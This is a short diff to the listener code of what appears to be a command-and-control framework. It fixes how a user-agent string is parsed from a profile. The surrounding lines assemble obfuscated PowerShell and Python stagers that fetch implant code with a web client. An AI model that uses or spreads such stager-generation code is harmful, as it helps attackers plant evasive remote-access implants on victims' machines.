@@ -152,7 +152,10 @@ class Listener:
                 stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("wc")+"=New-Object System.Net.WebClient;")
 
                 if userAgent.lower() == 'default':
-                    userAgent = profile.split('|')[1]
+                    if "|" in profile:
+                        userAgent = profile.split('|')[1]
+                    else:
+                        userAgent = ""
                 stager += "$u='"+userAgent+"';"
 
                 if 'https' in host:
@@ -238,7 +241,10 @@ class Listener:
                     print helpers.color(p, color='red')
 
                 if userAgent.lower() == 'default':
-                    userAgent = profile.split('|')[1]
+                    if "|" in profile:
+                        userAgent = profile.split('|')[1]
+                    else:
+                        userAgent = ""
 
                 launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
                 launcherBase += "UA='%s';" % (userAgent)
